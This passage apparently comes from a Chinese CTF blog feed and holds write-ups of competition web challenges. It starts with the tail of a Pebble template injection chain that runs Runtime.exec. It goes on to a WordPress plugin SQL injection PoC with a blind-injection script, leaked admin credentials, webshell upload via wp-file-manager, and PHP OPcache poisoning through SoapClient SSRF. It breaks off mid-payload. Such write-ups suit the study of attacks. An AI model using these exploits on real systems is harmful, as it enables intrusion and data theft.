beans.get(&quot;jacksonObjectMapper&quot;).getTypeFactory().findClass(&quot;com.mitchellbosecke.pebble.PebbleEngine$Builder&quot;) %&#125;<br>&#123;% set builder =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, builderClass) %&#125;<br><br>&#123;% set engine = builder.methodAccessValidator(accessValidator).build() %&#125;<br>&#123;% set loader = engine.getLoader() %&#125;<br>&#123;&#123; loader.setPrefix(&quot;/tmp&quot;) &#125;&#125;<br>&#123;&#123; loader.setSuffix(&quot;pebble&quot;) &#125;&#125;<br><br>&#123;% set rceFileName = request.getParameter(&quot;rceFileName&quot;) %&#125;<br><br>&#123;% set template = engine.getTemplate(rceFileName) %&#125;<br><br>&#123;&#123; template.evaluate(response.getWriter()) &#125;&#125;<br></code></pre></td></tr></table></figure><p>然后再传一个模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&#123;% set cmd = &#x27;xxx&#x27;.split(&quot;;&quot;) %&#125;<br>&#123;&#123; (1).TYPE.forName(&quot;java.lang.Runtime&quot;).methods[0].invoke(null, null).exec(cmd) &#125;&#125;<br></code></pre></td></tr></table></figure><p>然后加载模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">?x=xx&amp;rceFileName=xx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023DASCTF_X_0psu3十一月挑战赛</title>
    <link href="/2023/12/15/2023DASCTF_X_0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/12/15/2023DASCTF_X_0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="dasctf-11">2023DASCTF-11</h1><p>质量很高的一场dasctf月赛</p><h1 id="web">WEB</h1><h2 id="ezpenetration">EzPenetration</h2><blockquote><p>题目源自真实渗透案例</p><p>hint1：flag写入方式已修改。flag在wp那个机器的 /flag</p><p>hint2：数据库里的邮箱key已更改为管理员密码，拿到后可直接登录</p></blockquote><p>打开网站，看到是wordpress的站</p><figure><img src="/img/2023DASCTF-11/170264599168038.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>wpscan扫一下</p><p><code>wpscan --url http://node4.buuoj.cn:25061/ --api-token xxx</code></p><p>扫出几十个洞，根据提示找到email相关，这里有用的是这个插件的sql洞</p><p><code>[!] Title: Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</code></p><figure><img src="/img/2023DASCTF-11/17026459916671.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Plain">POST /wp-admin/admin-ajax.php?action=rtec_send_unregister_link HTTP/1.1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: en-GB,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 127<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br><br>event_id=3%20UNION%20SELECT%200,1,2,3,4,5,6,7,8,group_concat(user_email)%20from%20wp_users%20--%20x&amp;email=recipient@example.com<br></code></pre></td></tr></table></figure><p>试了一下是无回显的，用盲注跑</p><p>先看poc原理，化简一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">event_id=3 union select 1,2,3,4,5,6,7,8,9,10--&amp;email=recipient@example.com<br></code></pre></td></tr></table></figure><p>在第10位可以构造盲注，如果第10位true则返回success，否则返回error，那么利用<code>where 0^</code>来构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL">database() <span class="hljs-keyword">from</span> wp_users <span class="hljs-keyword">where</span> <span class="hljs-number">0</span><span class="hljs-operator">^</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br>database() <span class="hljs-keyword">from</span> wp_users <span class="hljs-keyword">where</span> <span class="hljs-number">0</span><span class="hljs-operator">^</span><span class="hljs-number">0</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><figure><img src="/img/2023DASCTF-11/17026459916672.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023DASCTF-11/17026459916673.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>参考wp用二分法跑sql，这里的关键是<code>group_concat(option_name,0x7e,option_value) from wp_options where option_id = 16</code>，获取<code>wp_options</code>表的第16行的name和value值，学到新姿势了</p><figure><img src="/img/2023DASCTF-11/17026459916674.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br>r=requests.session()<br>database_vule = <span class="hljs-string">&quot;&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://node4.buuoj.cn:25061/wp-admin/admin-ajax.php?action=rtec_send_unregister_link&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        mid = (low+high)//<span class="hljs-number">2</span><br>        payload = &#123;<br>            <span class="hljs-comment">#&quot;event_id&quot;:f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),&#123;i&#125;,1)) from wp_options where option_id = 16)&gt;&#123;mid&#125;)-- &quot;,</span><br>            <span class="hljs-string">&quot;event_id&quot;</span>:<span class="hljs-string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="hljs-subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 15)&gt;<span class="hljs-subst">&#123;mid&#125;</span>)-- &quot;</span>,<br>            <span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;recipient@example.com&quot;</span><br>        &#125;<br>        re=requests.post(url,data=payload)<br>        <span class="hljs-comment">#print(payload)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;success&quot;</span><span class="hljs-keyword">in</span> re.text):<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">127</span>:<br>        flag += <span class="hljs-built_in">chr</span>(low)<br>    <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拿到管理员账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Plain">mailserver_login~y4nshu@163.com<br>mailserver_pass~fO0CO2#0ky#oLgH1JI<br></code></pre></td></tr></table></figure><p>登录</p><figure><img src="/img/2023DASCTF-11/17026459916675.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>进入管理员后台，下载可以rce的插件，如：<code>wp-file-manager</code></p><p>6.0版本有漏洞，https://wordpress.org/plugins/wp-file-manager/advanced/</p><figure><img src="/img/2023DASCTF-11/17026459916676.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>访问http://node4.buuoj.cn:25061/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php，看到这个返回就说明漏洞利用成功了</p><figure><img src="/img/2023DASCTF-11/17026459916677.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">curl -F cmd=upload -F target=l1_ -F <span class="hljs-string">&quot;upload[]=@shell.php&quot;</span> -XPOST <span class="hljs-string">&quot;http://node4.buuoj.cn:25061/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span><br>&#123;<span class="hljs-string">&quot;added&quot;</span>:[&#123;<span class="hljs-string">&quot;isowner&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;ts&quot;</span>:1702386876,<span class="hljs-string">&quot;mime&quot;</span>:<span class="hljs-string">&quot;text\/x-php&quot;</span>,<span class="hljs-string">&quot;read&quot;</span>:1,<span class="hljs-string">&quot;write&quot;</span>:1,<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-string">&quot;25&quot;</span>,<span class="hljs-string">&quot;hash&quot;</span>:<span class="hljs-string">&quot;l1_c2hlbGwucGhw&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;phash&quot;</span>:<span class="hljs-string">&quot;l1_Lw&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/shell.php&quot;</span>&#125;],<span class="hljs-string">&quot;removed&quot;</span>:[],<span class="hljs-string">&quot;changed&quot;</span>:[&#123;<span class="hljs-string">&quot;isowner&quot;</span>:<span class="hljs-literal">false</span>,<span class="hljs-string">&quot;ts&quot;</span>:1702386876,<span class="hljs-string">&quot;mime&quot;</span>:<span class="hljs-string">&quot;directory&quot;</span>,<span class="hljs-string">&quot;read&quot;</span>:1,<span class="hljs-string">&quot;write&quot;</span>:1,<span class="hljs-string">&quot;size&quot;</span>:0,<span class="hljs-string">&quot;hash&quot;</span>:<span class="hljs-string">&quot;l1_Lw&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;files&quot;</span>,<span class="hljs-string">&quot;phash&quot;</span>:<span class="hljs-string">&quot;l1_L3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtZmlsZS1tYW5hZ2VyL2xpYg&quot;</span>,<span class="hljs-string">&quot;volumeid&quot;</span>:<span class="hljs-string">&quot;l1_&quot;</span>,<span class="hljs-string">&quot;locked&quot;</span>:1&#125;]&#125;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>webshell路径http://node4.buuoj.cn:25061/wp-content/plugins/wp-file-manager/lib/files/shell.php</p><figure><img src="/img/2023DASCTF-11/17026459916678.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>也可以用工具一把嗦，github上很多，不列举了</p><h2 id="single_php">single_php</h2><p>给了一个<code>$_GET['LuckyE'](__FILE__);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP">I have been single dog <span class="hljs-keyword">for</span> <span class="hljs-number">19</span> years.<br>One day, my brothers betrayed the singles organization.<br>S* <span class="hljs-keyword">and</span> B* ,both of them have the kanozyo.<br>Now revenge to them!!!!!<br><span class="hljs-keyword">use</span> &#x27;$<span class="hljs-title">_GET</span>[&#x27;<span class="hljs-title">LuckyE</span>&#x27;](<span class="hljs-title">__FILE__</span>);<span class="hljs-string">&#x27; to begin your revenge!!</span><br></code></pre></td></tr></table></figure><p>可以传<code>?LuckyE=highlight_file</code>看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs PHP">... <br> &lt;title&gt;revenge to siranai.php<br>...<br><br> <span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br> <br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();<br> &#125;<br> &#125;<br> <span class="hljs-variable">$kanozyo</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;LuckyE&#x27;</span>](<span class="hljs-keyword">__FILE__</span>);<br> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$kanozyo</span>);<br> <span class="hljs-variable">$suki</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;suki&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>提示有siranai.php，然后有个序列化，可以执行无参函数比如phpinfo()</p><p>siranai.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allowed_ip</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-variable">$allowed_ip</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;S* has the kanojo but you don&#x27;t&quot;</span>);<br>&#125;<br><br> <span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/x-tar&#x27;</span>)&#123;<br> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br> &#125;<br></code></pre></td></tr></table></figure><p>分析一下代码<code>$allowed_ip = "127.0.0.1";</code>，本地回环，要ssrf</p><p><code>$finfo = finfo_open(FILEINFO_MIME_TYPE);</code>获取文件的MIME类型</p><p><code>finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/x-tar'</code>检查文件类型为x-tar，这里注意tmp_name，将上传的文件重命名放到临时文件目录了<code>exec('cd /tmp &amp;&amp; tar -xvf ' . $_FILES["file"]["tmp_name"]);</code>上传到tmp然后解压</p><p>这里exec看起来可以单引号闭合进行rce，但是刚刚提到了文件会被重命名，所以无法闭合</p><p>软连接和目录穿越没有考虑过，但出题人也说是不可以的</p><blockquote><p>第一次出题,0解是意料之外,怕有各种奇奇怪怪的非预期,我将/var/www/html/目录改成只读了,虽然docker上测了目录穿越和软链接好像不行?师傅们轻点喷.</p></blockquote><p>没思路了，看wp</p><p>Zend OPcache扩展执行php代码</p><p>参考https://www.vuln.cn/6763</p><p>调个phpinfo看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();<br>    &#125;<br>&#125;<br><span class="hljs-comment">// $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__);</span><br><span class="hljs-comment">// var_dump($kanozyo);</span><br><span class="hljs-comment">// $suki = unserialize($_POST[&#x27;suki&#x27;]);</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<br><span class="hljs-variable">$a</span>-&gt;koi[<span class="hljs-string">&#x27;zhanjiangdiyishenqing&#x27;</span>] = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// O:6:&quot;siroha&quot;:1:&#123;s:3:&quot;koi&quot;;a:1:&#123;s:21:&quot;zhanjiangdiyishenqing&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>php8.2.10</p><figure><img src="/img/2023DASCTF-11/17026459916689.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>指定了缓存目录<code>opcache.file_cache</code>为<code>/tmp</code></p><figure><img src="/img/2023DASCTF-11/170264599166810.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>OPcache 存储了已编译的 PHP 脚本文件，这些缓存文件被放置在和 Web目录一致的目录结构中</p></blockquote><p>所以index.php的缓存文件会存在<code>/tmp/[system_id]/var/www/index.php.bin</code></p><blockquote><p>运行 Web 服务的用户对 OPcache缓存目录（如：/tmp/opcache/）里面的所有子目录以及文件都具有写权限。</p><p>因此，我们可以通过使用一个已经编译过的 webshell 的缓存文件替换OPcache 缓存目录中已有的缓存文件来达到执行恶意代码的目的。</p></blockquote><p>根据已知信息，可以有以下思路：</p><p>我们只要构造<code>index.php.bin</code>通过ssrf上传到缓存目录<code>/tmp</code>，覆盖掉原来的<code>index.php.bin</code>，再次访问index.php，就会执行恶意构造的opcode达到rce</p><p>现在有三个难点</p><ol type="1"><li>构造<code>index.php.bin</code></li><li>找到缓存目录，即求<code>[system_id]</code></li><li>ssrf上传tar</li></ol><p>先构造<code>index.php.bin</code></p><p>本地起个php8.2.10的docker，我用的是<code>docker pull php:8.2.10-apache</code></p><p>启动容器<code>docker run -d -p 8888:80 php:8.2.10-apache</code></p><p>因为php7以上自带opcache扩展，不用再另外安装，直接开启即可<code>docker-php-ext-enable opcache</code></p><p>新建index.php，写入一句话马，访问一下index.php</p><p>可以看到tmp目录下有了<code>index.php.bin</code></p><figure><img src="/img/2023DASCTF-11/170264599166811.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载到本地，这里注意原题开启了时间戳验证</p><figure><img src="/img/2023DASCTF-11/170264599166812.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>opcache.validate_timestamps=1，OPcache 会将被请求访问的 php源文件的时间戳与对应的缓存文件的时间戳进行对比校验。如果两个时间戳不匹配，缓存文件将被丢弃，并且重新生成一份新的缓存文件。要想绕过此限制，攻击者必须知道目标源文件的时间戳。</p></blockquote><p>那我们要知道题目里的index.php的时间，刚好php有个函数<code>filectime()</code>可以获取文件时间</p><figure><img src="/img/2023DASCTF-11/170264599166813.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>修改本地文件时间戳0x0040-0x0043位置</p><figure><img src="/img/2023DASCTF-11/170264599166814.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里我参考https://fdlucifer.github.io/2023/07/01/2023-chunqiubei-spring-php-again/手动改了，用脚本改也行</p><figure><img src="/img/2023DASCTF-11/170264599166815.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>求<code>[system_id]</code></p><p>这里其实不用求了，因为我本地docker起了一个完全相同的环境，所以路径其实就是：</p><p><code>/tmp/214510e772fba140ea7a33a277f2799e/var/www/html/index.php.bin</code></p><p>要算的话根据phpinfo里的信息计算</p><p>https://docs.google.com/presentation/d/18y60Xy0eVeUnBXIH_t3ikfly_uyYbtfI6zAuKCHtlac/edit#slide=id.g138319ca92_0_23</p><figure><img src="/img/2023DASCTF-11/170264599166816.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP">PHP Version          <span class="hljs-number">8.2</span>.<span class="hljs-number">10</span><br>Zend Extension        <span class="hljs-number">420220829</span><br>Zend Extension Build        API420220829,NTS<br></code></pre></td></tr></table></figure><p>脚本计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import hashlib<br>sys_id = hashlib.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-string">&quot;utf-8&quot;</span>)).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><span class="hljs-keyword">print</span>(sys_id)<br></code></pre></td></tr></table></figure><p>然后ssrf上传tar包</p><p>先用python创建tar包，然后伪造上传文件的数据包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import hashlib<br>import tarfile<br>import requests<br><br>url = <span class="hljs-string">&#x27;http://cca8d734-3d3a-4c6c-8a89-9330b5e6e00d.node4.buuoj.cn:81/siranai.php&#x27;</span><br>sys_id = <span class="hljs-string">&#x27;214510e772fba140ea7a33a277f2799e&#x27;</span><br>def <span class="hljs-title function_ invoke__">tar_file</span>():<br>    tar_filename = <span class="hljs-string">&#x27;exp.tar&#x27;</span><br>    with tarfile.<span class="hljs-title function_ invoke__">open</span>(tar_filename,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>        directory_info = tarfile.<span class="hljs-title function_ invoke__">TarInfo</span>(name=f<span class="hljs-string">&#x27;&#123;sys_id&#125;/var/www/html&#x27;</span>)<br>        directory_info.type = tarfile.DIRTYPE<br>        directory_info.mode = <span class="hljs-number">0o777</span><br><br>        tar.<span class="hljs-title function_ invoke__">addfile</span>(directory_info)<br><br>        tar.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-string">&#x27;index.php.bin&#x27;</span>, arcname=f<span class="hljs-string">&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;</span>)<br><br>def <span class="hljs-title function_ invoke__">upload</span>():<br>    file = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;exp.tar&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).<span class="hljs-title function_ invoke__">read</span>(),<span class="hljs-string">&quot;application/x-tar&quot;</span>)&#125;<br>    res  = requests.<span class="hljs-title function_ invoke__">post</span>(url=url,files=file)<br>    <span class="hljs-keyword">print</span>(res.request.headers)<br>    <span class="hljs-keyword">return</span> res.request<br><br><span class="hljs-title function_ invoke__">tar_file</span>()<br>request_content = <span class="hljs-title function_ invoke__">upload</span>()<br>upload_body = <span class="hljs-title function_ invoke__">str</span>(request_content.body).<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)<br>content_length = request_content.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]<br>with <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;ssrf_data.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.<span class="hljs-title function_ invoke__">write</span>(upload_body+<span class="hljs-string">&#x27;\n&#x27;</span>+content_length)<br></code></pre></td></tr></table></figure><p>接着就是怎么将这个文件包传上去</p><p>又回到index.php，index.php可以调用任意的无参方法，又要ssrf，上传文件，那么想到的只有php原生类<code>SoapClient</code>去打ssrf</p><p>也就是SoapClient的__call方法，SoapClient类，调用一个不存在的函数会去调用<code>__call</code>方法</p><p>这里注意Content-Length刚刚脚本单独打印出来了以防错误</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">siroha</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$koi</span>;<br><br>&#125;<br><span class="hljs-variable">$postdata</span> = <span class="hljs-string">&quot;--229aafba818c5da83cd0547a3a0002d5\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;exp.tar\&quot;\r\nContent-Type: application/x-tar\r\n\r\n214510e772fba140ea7a33a277f2799e/var/www/html/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000777\x000000000\x000000000\x0000000000000\x0000000000000\x00014543\x00 